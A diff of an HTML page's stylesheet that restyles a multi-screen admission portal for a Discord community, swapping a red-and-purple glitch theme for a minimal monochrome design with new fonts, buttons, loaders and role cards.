@@ -3,32 +3,30 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Sombra Coletiva — Portal de Admissão</title>
-<link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400;700;900&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<title>Portal de Admissão</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
 /* ════════════════════════════════════════
    ROOT & RESET
 ════════════════════════════════════════ */
 :root {
-  --bg: #020202;
-  --red: #cc0020;
-  --red-dim: #7a0012;
-  --purple: #3d0066;
-  --purple-l: #8b3fc0;
-  --gold: #b89a0c;
-  --text: #e8e8e8;
-  --dim: #444;
-  --panel: rgba(6,6,6,0.98);
-  --border: #181818;
-  --glow-r: rgba(204,0,32,0.45);
-  --glow-p: rgba(139,63,192,0.3);
+  --bg: #0a0a0a;
+  --bg-light: #1a1a1a;
+  --text: #f5f5f5;
+  --text-dim: #a0a0a0;
+  --accent: #ffffff;
+  --accent-dim: #d0d0d0;
+  --border: #2a2a2a;
+  --glow: rgba(255,255,255,0.1);
 }
+
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif}
-::-webkit-scrollbar{width:3px}
-::-webkit-scrollbar-track{background:#050505}
-::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Poppins',sans-serif}
+
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#0f0f0f}
+::-webkit-scrollbar-thumb{background:var(--accent-dim);border-radius:2px}
 
 /* ════════════════════════════════════════
    CANVAS BACKGROUND
@@ -36,371 +34,390 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 #bgCanvas{position:fixed;inset:0;z-index:0;pointer-events:none}
 
 /* ════════════════════════════════════════
-   GLOBAL CHROME
-════════════════════════════════════════ */
-.top-bar{position:fixed;top:0;left:0;right:0;height:2px;z-index:9999;
-  background:linear-gradient(90deg,transparent,var(--red),var(--purple-l),var(--red),transparent);
-  animation:barPulse 3s ease-in-out infinite}
-@keyframes barPulse{0%,100%{opacity:1}50%{opacity:.35}}
-
-.corner{position:fixed;z-index:9998;width:28px;height:28px;border-style:solid;border-color:var(--red);border-width:0}
-.c-tl{top:10px;left:10px;border-top-width:1.5px;border-left-width:1.5px}
-.c-tr{top:10px;right:10px;border-top-width:1.5px;border-right-width:1.5px}
-.c-bl{bottom:10px;left:10px;border-bottom-width:1.5px;border-left-width:1.5px}
-.c-br{bottom:10px;right:10px;border-bottom-width:1.5px;border-right-width:1.5px}
-
-/* ════════════════════════════════════════
    SCREEN SYSTEM
 ════════════════════════════════════════ */
 .screen{
   position:fixed;inset:0;z-index:1;
   display:flex;flex-direction:column;align-items:center;justify-content:center;
-  padding:20px;
+  padding:40px 20px;
   opacity:0;pointer-events:none;
-  transition:opacity .7s ease,transform .7s ease;
-  transform:scale(1.02)
+  transition:opacity .6s ease,transform .6s ease;
+  transform:scale(1.05)
 }
 .screen.active{opacity:1;pointer-events:all;transform:scale(1)}
-.screen.out{opacity:0;transform:scale(.97)}
+.screen.out{opacity:0;transform:scale(.95)}
 .scroll-screen{
   overflow-y:auto;max-height:100vh;
-  justify-content:flex-start;padding-top:70px;padding-bottom:40px
+  justify-content:flex-start;padding-top:80px;padding-bottom:50px
 }
 
 /* ════════════════════════════════════════
-   PROGRESS DOTS
+   ──── SCREEN 0: SPLASH PROFISSIONAL ────
 ════════════════════════════════════════ */
-#dotBar{
-  position:fixed;bottom:18px;left:50%;transform:translateX(-50%);
-  display:none;gap:7px;z-index:500;align-items:center
+.splash-wrap{text-align:center;user-select:none;max-width:700px}
+
+.splash-logo-container{margin-bottom:60px;opacity:0;animation:logoFade .8s ease .3s forwards}
+@keyframes logoFade{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
+
+.splash-logo{font-size:4rem;margin-bottom:20px;display:inline-block}
+
+.splash-main-title{
+  font-size:clamp(2.5rem,6vw,4rem);
+  font-weight:800;
+  color:var(--text);
+  letter-spacing:-1px;
+  line-height:1.1;
+  margin-bottom:16px;
+  opacity:0;
+  animation:titleIn .8s ease .5s forwards;
 }
-.dot{width:5px;height:5px;border-radius:50%;background:#1c1c1c;transition:.3s}
-.dot.done{background:var(--red-dim)}
-.dot.now{background:var(--red);box-shadow:0 0 8px var(--glow-r)}
+@keyframes titleIn{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
+
+.splash-subtitle{
+  font-size:clamp(1rem,3vw,1.4rem);
+  color:var(--text-dim);
+  font-weight:400;
+  letter-spacing:.5px;
+  margin-bottom:50px;
+  line-height:1.6;
+  opacity:0;
+  animation:subtitleIn .8s ease .7s forwards;
+}
+@keyframes subtitleIn{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
+
+/* Progress line elegante */
+.progress-container{width:100%;max-width:400px;margin:50px auto 0;opacity:0;animation:containerIn .8s ease .9s forwards}
+@keyframes containerIn{from{opacity:0}to{opacity:1}}
+
+.progress-line{
+  position:relative;width:100%;height:2px;background:var(--border);border-radius:1px;
+  overflow:hidden;margin-bottom:20px
+}
+.progress-fill{
+  height:100%;background:linear-gradient(90deg,var(--accent-dim),var(--accent),var(--accent-dim));
+  width:0%;animation:progressAnim 3s ease-in-out forwards;border-radius:1px
+}
+@keyframes progressAnim{0%{width:0%}100%{width:100%}}
+
+.progress-text{
+  display:flex;justify-content:space-between;align-items:center;
+  font-size:.75rem;color:var(--text-dim);letter-spacing:1px;text-transform:uppercase
+}
+.progress-num{font-variant-numeric:tabular-nums}
+
+.cta-button{
+  display:inline-flex;align-items:center;justify-content:center;gap:12px;
+  padding:15px 45px;background:var(--accent);color:var(--bg);
+  border:1.5px solid var(--accent);border-radius:0;cursor:pointer;
+  font-weight:700;font-size:.85rem;letter-spacing:1px;text-transform:uppercase;
+  transition:.4s cubic-bezier(.34,.1,.64,.35);
+  margin-top:50px;opacity:0;
+  animation:ctaIn .8s ease 1.1s forwards;
+  font-family:'Poppins',sans-serif;
+  position:relative;overflow:hidden
+}
+@keyframes ctaIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+
+.cta-button::before{
+  content:'';position:absolute;inset:0;
+  background:var(--bg);transform:scaleX(0);transform-origin:right;
+  transition:transform .4s cubic-bezier(.34,.1,.64,.35)
+}
+.cta-button:hover::before{transform:scaleX(1);transform-origin:left}
+.cta-button:hover{color:var(--text)}
+
+.cta-button i{position:relative;z-index:1}
+.cta-button span{position:relative;z-index:1}
 
 /* ════════════════════════════════════════
-   ──── SCREEN 0: SPLASH ────
+   ANIMATED BORDER ELEMENTS
 ════════════════════════════════════════ */
-.splash-wrap{text-align:center;user-select:none}
+.corner-accent{position:fixed;z-index:9998}
+.corner-accent::before,.corner-accent::after{
+  content:'';position:absolute;background:var(--accent)
+}
 
-.sc-title{
-  font-family:'Cinzel Decorative',cursive;
-  font-size:clamp(2.2rem,7vw,5.8rem);
-  font-weight:900;
-  color:#fff;
-  letter-spacing:5px;
-  line-height:1.15;
-  text-shadow:0 0 40px rgba(204,0,32,.9),0 0 80px rgba(204,0,32,.4),0 0 160px rgba(204,0,32,.15);
-  animation:titleBreath 4s ease-in-out infinite;
-  position:relative
-}
-@keyframes titleBreath{
-  0%,100%{text-shadow:0 0 40px rgba(204,0,32,.9),0 0 80px rgba(204,0,32,.4)}
-  50%{text-shadow:0 0 70px rgba(204,0,32,1),0 0 130px rgba(204,0,32,.6),0 0 220px rgba(204,0,32,.25)}
-}
-/* glitch layers */
-.sc-title::before,.sc-title::after{
-  content:attr(data-t);position:absolute;top:0;left:0;width:100%;height:100%;
-  font-family:inherit;font-size:inherit;font-weight:inherit;letter-spacing:inherit
-}
-.sc-title::before{color:#ff003c;animation:gA 5s steps(1) infinite;clip-path:polygon(0 20%,100% 20%,100% 45%,0 45%)}
-.sc-title::after{color:#7b2fbf;animation:gB 5s steps(1) infinite;clip-path:polygon(0 58%,100% 58%,100% 78%,0 78%)}
-@keyframes gA{0%,88%,93%,100%{opacity:0;transform:translate(0)}89%{opacity:1;transform:translate(-4px,2px)}90%{opacity:1;transform:translate(3px,-1px)}92%{opacity:0}}
-@keyframes gB{0%,82%,87%,100%{opacity:0;transform:translate(0)}83%{opacity:1;transform:translate(4px,-2px)}86%{opacity:0}}
+.tl{top:30px;left:30px}
+.tl::before{width:30px;height:1.5px}
+.tl::after{width:1.5px;height:30px}
 
-.splash-tag{
-  font-family:'Share Tech Mono';font-size:.7rem;color:#222;
-  letter-spacing:7px;text-transform:uppercase;margin-top:14px;
-  animation:tagAnim 2.5s ease-in-out infinite alternate
-}
-@keyframes tagAnim{from{color:#1a1a1a}to{color:#444}}
+.tr{top:30px;right:30px}
+.tr::before{width:30px;height:1.5px}
+.tr::after{width:1.5px;height:30px}
 
-/* ════════════════════════════════════════
-   COUNTDOWN RING
-════════════════════════════════════════ */
-.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:22px;margin-top:50px}
-.cd-ring{position:relative;width:82px;height:82px}
-.cd-ring svg{width:82px;height:82px;transform:rotate(-90deg)}
-.cd-ring .r-bg{fill:none;stroke:#0d0d0d;stroke-width:2.5}
-.cd-ring .r-fg{fill:none;stroke-width:2.5;stroke-linecap:round;transition:stroke-dashoffset 1s linear;stroke:var(--red)}
-.cd-num{
-  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
-  font-family:'Orbitron';font-size:1.5rem;font-weight:700;color:var(--red)
-}
+.bl{bottom:30px;left:30px}
+.bl::before{width:30px;height:1.5px}
+.bl::after{width:1.5px;height:30px}
+
+.br{bottom:30px;right:30px}
+.br::before{width:30px;height:1.5px}
+.br::after{width:1.5px;height:30px}
 
 /* ════════════════════════════════════════
    BUTTONS
 ════════════════════════════════════════ */
 .btn{
-  font-family:'Orbitron';font-weight:700;font-size:.7rem;letter-spacing:4px;
+  font-family:'Poppins',sans-serif;font-weight:600;font-size:.8rem;letter-spacing:1px;
   text-transform:uppercase;cursor:pointer;border:none;outline:none;
   position:relative;overflow:hidden;transition:.35s;
-  display:inline-flex;align-items:center;justify-content:center;gap:10px
+  display:inline-flex;align-items:center;justify-content:center;gap:10px;
+  border-radius:0
 }
-.btn::after{
-  content:'';position:absolute;inset:0;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.06),transparent);
-  transform:translateX(-100%);transition:.5s ease
-}
-.btn:hover::after{transform:translateX(100%)}
 
 .btn-main{
-  padding:16px 52px;background:#000;color:#fff;
-  clip-path:polygon(14px 0%,100% 0%,calc(100% - 14px) 100%,0% 100%);
-  border:1px solid #1e1e1e
+  padding:14px 40px;background:transparent;color:var(--text);
+  border:1.5px solid var(--accent);
+  position:relative
 }
-.btn-main:hover{border-color:var(--red);color:var(--red);box-shadow:0 0 25px rgba(204,0,32,.25)}
-.btn-main:disabled{opacity:.18;cursor:not-allowed}
-.btn-main.hidden{opacity:0;pointer-events:none;transform:translateY(10px);transition:.6s}
-.btn-main.show{opacity:1;pointer-events:all;transform:translateY(0)}
+.btn-main::before{
+  content:'';position:absolute;inset:0;
+  background:var(--accent);transform:scaleX(0);transform-origin:right;
+  transition:.4s cubic-bezier(.34,.1,.64,.35);z-index:-1
+}
+.btn-main:hover::before{transform:scaleX(1);transform-origin:left}
+.btn-main:hover{color:var(--bg)}
 
-.btn-sm{
-  padding:12px 22px;background:rgba(204,0,32,.08);color:var(--red);
-  border:1px solid rgba(204,0,32,.25);border-radius:4px;font-size:.6rem
-}
-.btn-sm:hover{background:var(--red);color:#fff;box-shadow:0 0 20px var(--glow-r)}
-
-.btn-ghost{
-  padding:12px 22px;background:transparent;color:#333;
-  border:1px solid #1c1c1c;border-radius:4px;font-size:.6rem
-}
-.btn-ghost:hover{color:#666;border-color:#2a2a2a}
+.btn-main.hidden{opacity:0;pointer-events:none;transform:translateY(10px)}
+.btn-main.show{opacity:1;pointer-events:all;transform:translateY(0);animation:slideUp .5s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
 
 .btn-accept{
-  padding:14px 38px;background:transparent;color:#00ff55;
-  border:1px solid #00ff55;
-  clip-path:polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%);font-size:.65rem
+  padding:13px 35px;background:transparent;color:var(--text);
+  border:1.5px solid var(--text);border-radius:0;font-size:.75rem;
+  transition:.3s ease
 }
-.btn-accept:hover{background:rgba(0,255,85,.1);box-shadow:0 0 20px rgba(0,255,85,.2)}
+.btn-accept:hover{background:var(--text);color:var(--bg)}
 
 .btn-refuse{
-  padding:14px 38px;background:transparent;color:var(--red);
-  border:1px solid var(--red);
-  clip-path:polygon(10px 0%,100% 0%,calc(100% - 10px) 100%,0% 100%);font-size:.65rem
+  padding:13px 35px;background:transparent;color:var(--text-dim);
+  border:1.5px solid var(--text-dim);border-radius:0;font-size:.75rem;
+  transition:.3s ease
 }
-.btn-refuse:hover{background:rgba(204,0,32,.1);box-shadow:0 0 20px var(--glow-r)}
+.btn-refuse:hover{background:var(--text-dim);color:var(--bg)}
 
 .btn-send{
-  width:100%;padding:17px;background:var(--red);color:#fff;border-radius:6px;
-  font-size:.75rem;margin-top:16px;
-  box-shadow:0 4px 25px rgba(204,0,32,.3)
+  width:100%;padding:14px;background:var(--accent);color:var(--bg);
+  border:none;border-radius:0;font-size:.75rem;margin-top:20px;
+  font-weight:700;letter-spacing:1px;transition:.3s ease;text-transform:uppercase
 }
-.btn-send:hover{background:#a50019;box-shadow:0 6px 35px rgba(204,0,32,.5);transform:translateY(-1px)}
-.btn-send:disabled{opacity:.3;cursor:not-allowed;transform:none}
+.btn-send:hover{background:var(--accent-dim);transform:translateY(-2px)}
+.btn-send:disabled{opacity:.3;cursor:not-allowed}
 
 /* ════════════════════════════════════════
-   ──── SCREEN 1: WARNING ────
+   ──── COUNTDOWN RING ────
 ════════════════════════════════════════ */
-.warn-box{text-align:center;max-width:580px}
-.warn-icon{font-size:2.8rem;color:var(--red);margin-bottom:22px;animation:iconP 2s ease-in-out infinite}
-@keyframes iconP{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
-.hr-glow{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--red),transparent);margin:26px 0}
-.warn-text{font-size:clamp(1.3rem,4vw,2rem);font-weight:600;color:#bbb;line-height:1.5}
-.warn-text em{color:#fff;font-style:normal;font-weight:700}
+.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:30px;margin-top:60px}
+.cd-ring{position:relative;width:100px;height:100px}
+.cd-ring svg{width:100px;height:100px;transform:rotate(-90deg)}
+.cd-ring .r-bg{fill:none;stroke:var(--border);stroke-width:2}
+.cd-ring .r-fg{fill:none;stroke-width:2;stroke-linecap:round;transition:stroke-dashoffset 1s linear;stroke:var(--accent)}
+.cd-num{
+  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  font-family:'Space Mono',monospace;font-size:2rem;font-weight:700;color:var(--text)
+}
 
 /* ════════════════════════════════════════
-   ──── SCREEN 2: MANIFESTO ────
+   FORMS & INPUTS
 ════════════════════════════════════════ */
-.manifesto-box{max-width:680px;width:100%;text-align:center}
-.m-header{font-family:'Share Tech Mono';font-size:clamp(.75rem,2vw,.95rem);color:#666;letter-spacing:3px;margin-bottom:28px;animation:mhGlow 3s ease-in-out infinite alternate}
-@keyframes mhGlow{from{color:#555}to{color:#999;text-shadow:0 0 20px rgba(184,150,12,.4)}}
-.m-crown{font-family:'Orbitron';font-size:clamp(1rem,3vw,1.4rem);color:var(--gold);letter-spacing:5px;margin-bottom:32px;text-shadow:0 0 20px rgba(184,150,12,.5)}
+.sk-layout{
+  display:flex;align-items:center;justify-content:center;
+  gap:60px;flex-wrap:wrap;padding:20px;max-width:1000px
+}
+
+.sk-panel{max-width:450px;width:100%}
+
+.bubble{
+  background:transparent;border:1.5px solid var(--border);border-radius:0;
+  padding:25px;margin-bottom:25px;position:relative
+}
+
+.bubble-name{
+  font-family:'Space Mono',monospace;font-size:.7rem;color:var(--text-dim);
+  letter-spacing:2px;margin-bottom:12px;text-transform:uppercase;font-weight:700
+}
+
+.bubble-text{
+  font-size:1.1rem;font-weight:400;color:var(--text);line-height:1.6
+}
+.bubble-text strong{color:var(--accent);font-weight:600}
+
+.sk-field{position:relative;margin-bottom:6px}
+.sk-field::after{
+  content:'';position:absolute;bottom:0;left:0;width:0;height:1px;
+  background:var(--accent);transition:width .4s ease
+}
+.sk-field:focus-within::after{width:100%}
+
+.sk-input{
+  width:100%;background:transparent;border:1px solid var(--border);
+  border-bottom:none;padding:14px 16px;color:var(--text);
+  font-family:'Poppins',sans-serif;font-size:.95rem;
+  border-radius:0;outline:none;transition:.3s;letter-spacing:.5px
+}
+.sk-input:focus{background:var(--glow);border-color:var(--accent-dim)}
+.sk-input::placeholder{color:var(--text-dim)}
+
+/* ════════════════════════════════════════
+   LOADING SCREEN
+════════════════════════════════════════ */
+.load-box{text-align:center;max-width:600px}
+
+.loader-minimal{position:relative;width:120px;height:120px;margin:0 auto 50px}
+.ld-line{
+  position:absolute;background:var(--accent);
+  transform-origin:center
+}
+.ld-line-1{top:50%;left:50%;width:60px;height:2px;margin-left:-30px;margin-top:-1px;animation:rotate1 3s linear infinite}
+.ld-line-2{top:50%;left:50%;width:40px;height:2px;margin-left:-20px;margin-top:-1px;opacity:.6;animation:rotate2 4s linear infinite reverse}
+.ld-line-3{top:50%;left:50%;width:80px;height:1px;margin-left:-40px;margin-top:-0.5px;opacity:.3;animation:rotate1 5s linear infinite}
+@keyframes rotate1{to{transform:rotate(360deg)}}
+@keyframes rotate2{to{transform:rotate(-360deg)}}
+
+.ld-phase{
+  font-family:'Space Mono',monospace;font-size:.8rem;color:var(--text-dim);
+  letter-spacing:2px;margin-bottom:30px;min-height:20px;text-transform:uppercase;
+  transition:.4s;font-weight:500
+}
+
+.ld-bar-w{width:300px;max-width:90vw;height:1px;background:var(--border);margin:0 auto 15px}
+.ld-bar{height:100%;width:0%;background:var(--accent);transition:width .2s ease}
+
+.ld-pct{font-family:'Space Mono',monospace;font-size:.7rem;color:var(--text-dim);letter-spacing:2px;text-transform:uppercase}
+
+/* ════════════════════════════════════════
+   WARNING SCREEN
+════════════════════════════════════════ */
+.warn-box{text-align:center;max-width:600px}
+.warn-icon{font-size:3.5rem;margin-bottom:30px;animation:iconPulse 2.5s ease-in-out infinite}
+@keyframes iconPulse{0%,100%{transform:scale(1);opacity:.7}50%{transform:scale(1.1);opacity:1}}
+.hr-glow{width:100%;height:1px;background:var(--border);margin:30px 0}
+.warn-text{font-size:1.3rem;font-weight:500;color:var(--text);line-height:1.7}
+.warn-text em{color:var(--accent);font-style:normal;font-weight:600}
+
+/* ════════════════════════════════════════
+   MANIFESTO SCREEN
+════════════════════════════════════════ */
+.manifesto-box{max-width:700px;width:100%;text-align:center}
+.m-header{
+  font-family:'Space Mono',monospace;font-size:.75rem;color:var(--text-dim);
+  letter-spacing:3px;margin-bottom:35px;text-transform:uppercase;font-weight:500
+}
 
 .m-line{
-  display:flex;align-items:flex-start;gap:14px;margin-bottom:18px;text-align:left;
-  opacity:0;transform:translateX(-22px);transition:.55s ease;
-  font-size:clamp(.88rem,2.3vw,1rem);color:#aaa;line-height:1.45
+  display:flex;align-items:flex-start;gap:16px;margin-bottom:24px;text-align:left;
+  opacity:0;transform:translateX(-20px);transition:.6s cubic-bezier(.34,.1,.64,.35);
+  font-size:1rem;color:var(--text);line-height:1.6
 }
 .m-line.on{opacity:1;transform:translateX(0)}
-.m-line strong{color:#e8e8e8}
-.m-ico{flex-shrink:0;font-size:1.05rem;margin-top:2px}
+.m-line strong{color:var(--accent);font-weight:700}
+.m-ico{flex-shrink:0;font-size:1.3rem;margin-top:2px}
 
 .m-footer{
-  font-family:'Orbitron';font-size:clamp(.7rem,1.8vw,.9rem);color:var(--red);
-  letter-spacing:4px;margin-top:28px;
-  opacity:0;transition:opacity 1.2s ease;text-shadow:0 0 20px var(--glow-r)
+  font-family:'Space Mono',monospace;font-size:.8rem;color:var(--text);
+  letter-spacing:2px;margin-top:35px;text-transform:uppercase;
+  opacity:0;transition:opacity 1s ease;font-weight:600
 }
 .m-footer.on{opacity:1}
 
 /* ════════════════════════════════════════
-   ──── SCREEN 3: LOADING ────
+   ROLES SCREEN
 ════════════════════════════════════════ */
-.load-box{text-align:center}
-
-.loader-rig{position:relative;width:170px;height:170px;margin:0 auto 44px}
-.ld-ring{position:absolute;inset:0;border-radius:50%;border:1.5px solid transparent}
-.ld-r1{border-top-color:var(--red);border-right-color:var(--red);animation:lspin 1.1s linear infinite}
-.ld-r2{border-bottom-color:var(--purple-l);border-left-color:var(--purple-l);animation:lspin2 1.7s linear infinite;inset:18px}
-.ld-r3{border-top-color:var(--gold);animation:lspin 2.4s linear infinite;inset:36px}
-.ld-r4{border-right-color:rgba(204,0,32,.3);animation:lspin2 3.5s linear infinite;inset:52px}
-@keyframes lspin{to{transform:rotate(360deg)}}
-@keyframes lspin2{to{transform:rotate(-360deg)}}
-.ld-core{
-  position:absolute;inset:66px;border-radius:50%;
-  background:radial-gradient(circle,rgba(204,0,32,.25),transparent);
-  display:flex;align-items:center;justify-content:center;
-  font-family:'Orbitron';font-size:.55rem;color:var(--red);letter-spacing:1px;
-  animation:coreP 1.6s ease-in-out infinite alternate
-}
-@keyframes coreP{from{box-shadow:0 0 10px rgba(204,0,32,.3)}to{box-shadow:0 0 30px rgba(204,0,32,.7)}}
-
-.ld-phase{font-family:'Share Tech Mono';font-size:.72rem;color:#333;letter-spacing:2.5px;margin-bottom:22px;min-height:18px;transition:.4s}
-.ld-bar-w{width:280px;max-width:85vw;height:2px;background:#0d0d0d;margin:0 auto 12px;border-radius:1px;overflow:hidden}
-.ld-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--red-dim),var(--red));border-radius:1px;transition:width .25s ease}
-.ld-pct{font-family:'Orbitron';font-size:.58rem;color:#2a2a2a;letter-spacing:2px}
-
-/* ════════════════════════════════════════
-   ──── SLAYKTTY SCREENS ────
-════════════════════════════════════════ */
-.sk-layout{
-  display:flex;align-items:center;justify-content:center;
-  gap:40px;flex-wrap:wrap;padding:20px
-}
-.sk-char{
-  width:150px;flex-shrink:0;
-  filter:drop-shadow(0 0 18px rgba(204,0,32,.5)) drop-shadow(0 0 40px rgba(139,63,192,.2));
-  animation:charFloat 3.2s ease-in-out infinite
-}
-@keyframes charFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-14px)}}
-
-.sk-panel{max-width:400px;width:100%}
-
-.bubble{
-  background:rgba(6,6,6,.97);
-  border:1px solid #181818;
-  border-radius:12px 12px 12px 3px;
-  padding:20px 22px;margin-bottom:18px;position:relative
-}
-.bubble::before{
-  content:'';position:absolute;left:-9px;bottom:18px;
-  border:9px solid transparent;border-right-color:#181818
-}
-.bubble::after{
-  content:'';position:absolute;left:-7px;bottom:19.5px;
-  border:7.5px solid transparent;border-right-color:rgba(6,6,6,.97)
-}
-.bubble-name{font-family:'Share Tech Mono';font-size:.58rem;color:var(--red);letter-spacing:2.5px;margin-bottom:9px}
-.bubble-text{font-size:clamp(.95rem,2.8vw,1.15rem);font-weight:500;color:#ccc;line-height:1.5}
-.bubble-text strong{color:#fff}
-
-.sk-field{position:relative;margin-bottom:4px}
-.sk-field::after{
-  content:'';position:absolute;bottom:0;left:0;width:0;height:1.5px;
-  background:var(--red);transition:width .4s ease
-}
-.sk-field:focus-within::after{width:100%}
-.sk-input{
-  width:100%;background:#040404;border:1px solid #151515;
-  border-bottom:none;padding:13px 16px;color:#e0e0e0;
-  font-family:'Share Tech Mono';font-size:.82rem;
-  border-radius:5px 5px 0 0;outline:none;transition:.3s
-}
-.sk-input:focus{background:#080808;border-color:#1e1e1e;color:#fff}
-.sk-input::placeholder{color:#252525}
-
-/* ════════════════════════════════════════
-   ──── ROLES SCREEN ────
-════════════════════════════════════════ */
-.roles-outer{max-width:700px;width:100%}
-.roles-header{display:flex;align-items:center;gap:18px;margin-bottom:20px;flex-wrap:wrap}
+.roles-outer{max-width:850px;width:100%}
+.roles-header{display:flex;align-items:flex-start;gap:30px;margin-bottom:35px;flex-wrap:wrap}
 .roles-grid{
-  display:grid;grid-template-columns:repeat(auto-fill,minmax(195px,1fr));
-  gap:9px;margin-top:4px
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+  gap:12px;margin-top:20px
 }
+
 .r-card{
-  background:#040404;border:1px solid #141414;
-  padding:13px 15px;border-radius:7px;cursor:pointer;
-  transition:.28s;color:#484848;position:relative;overflow:hidden
+  background:transparent;border:1.5px solid var(--border);
+  padding:16px;cursor:pointer;
+  transition:.3s ease;color:var(--text-dim);position:relative;overflow:hidden;
+  border-radius:0
 }
 .r-card::before{
-  content:'';position:absolute;left:0;top:0;bottom:0;width:2px;
-  background:var(--red);transform:scaleY(0);transition:.28s ease;transform-origin:bottom
+  content:'';position:absolute;left:0;top:0;bottom:0;width:1.5px;
+  background:var(--accent);transform:scaleY(0);transition:.3s ease;transform-origin:bottom
 }
-.r-card:hover{color:#888;border-color:#222}
-.r-card:hover::before{transform:scaleY(.4)}
-.r-card.sel{border-color:var(--red);color:#fff;background:rgba(204,0,32,.07);box-shadow:0 0 22px rgba(204,0,32,.12)}
+.r-card:hover{color:var(--text);border-color:var(--accent-dim)}
+.r-card:hover::before{transform:scaleY(.5)}
+.r-card.sel{border-color:var(--accent);color:var(--text);background:var(--glow)}
 .r-card.sel::before{transform:scaleY(1)}
-.r-name{font-weight:700;font-size:.88rem}
-.r-desc{font-size:.68rem;color:#333;margin-top:4px;line-height:1.3}
-.r-card.sel .r-desc{color:#555}
+
+.r-name{font-weight:700;font-size:.95rem;margin-bottom:6px}
+.r-desc{font-size:.75rem;color:var(--text-dim);line-height:1.4}
+.r-card.sel .r-desc{color:var(--text)}
 
 /* ════════════════════════════════════════
-   ──── DISCORD SCREEN ────
+   DISCORD SCREEN
 ════════════════════════════════════════ */
-.discord-wrap{text-align:center;max-width:480px}
+.discord-wrap{text-align:center;max-width:500px}
 .dc-card{
-  background:#313338;border-radius:12px;padding:28px 24px;margin:22px 0;
-  border:1px solid #3a3d42;box-shadow:0 20px 60px rgba(0,0,0,.85)
+  background:var(--bg-light);border:1.5px solid var(--border);padding:30px;
+  margin:30px 0;border-radius:0;box-shadow:0 20px 60px rgba(0,0,0,.3)
 }
-.dc-icon{font-size:2.8rem;color:#5865f2;margin-bottom:14px}
-.dc-name{font-family:'Orbitron';font-size:1rem;color:#fff;letter-spacing:2.5px;margin-bottom:7px}
-.dc-sub{font-family:'Share Tech Mono';font-size:.65rem;color:#888}
-.dc-members{display:flex;gap:18px;justify-content:center;margin-top:12px}
-.dc-members span{font-size:.7rem;color:#888;display:flex;align-items:center;gap:5px}
-.dc-online{color:#23a559}
-.dc-link{font-family:'Share Tech Mono';font-size:.62rem;color:#3a3d42;margin-top:9px}
-.dc-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:4px}
+.dc-icon{font-size:2.5rem;margin-bottom:15px;opacity:.8}
+.dc-name{font-family:'Poppins',sans-serif;font-size:1.1rem;color:var(--text);letter-spacing:1px;margin-bottom:8px;font-weight:700}
+.dc-sub{font-family:'Space Mono',monospace;font-size:.7rem;color:var(--text-dim);text-transform:uppercase}
+.dc-link{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--text-dim);margin-top:12px;letter-spacing:.5px}
+.dc-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-top:20px}
 
 /* ════════════════════════════════════════
-   ──── DONE SCREEN ────
+   DONE SCREEN
 ════════════════════════════════════════ */
 .done-wrap{text-align:center}
-.done-symbol{font-size:4rem;margin-bottom:18px;animation:doneG 2s ease-in-out infinite alternate}
-@keyframes doneG{from{text-shadow:0 0 20px rgba(204,0,32,.5)}to{text-shadow:0 0 60px rgba(204,0,32,1),0 0 100px rgba(204,0,32,.4)}}
-.done-title{font-family:'Orbitron';font-size:clamp(1.1rem,3vw,1.6rem);color:#fff;letter-spacing:4px;margin-bottom:10px}
-.hr-thin{width:180px;height:1px;background:linear-gradient(90deg,transparent,var(--red),transparent);margin:14px auto}
-.done-name{font-family:'Share Tech Mono';font-size:.8rem;color:var(--red);letter-spacing:2px}
-.done-info{font-family:'Share Tech Mono';font-size:.65rem;color:#2a2a2a;letter-spacing:2px;margin-top:6px}
+.done-symbol{font-size:4rem;margin-bottom:25px;animation:symbolGlow 2.5s ease-in-out infinite}
+@keyframes symbolGlow{0%,100%{opacity:.7}50%{opacity:1;transform:scale(1.08)}}
+.done-title{font-size:clamp(1.2rem,3vw,1.8rem);color:var(--text);letter-spacing:2px;margin-bottom:15px;font-weight:700;text-transform:uppercase}
+.hr-thin{width:200px;height:1px;background:var(--border);margin:20px auto;opacity:.6}
+.done-name{font-family:'Space Mono',monospace;font-size:.9rem;color:var(--text);letter-spacing:1px;text-transform:uppercase;font-weight:600}
+.done-info{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--text-dim);letter-spacing:1px;margin-top:8px;text-transform:uppercase}
 
 /* ════════════════════════════════════════
-   THEME SELECTOR
+   PROGRESS DOTS
 ════════════════════════════════════════ */
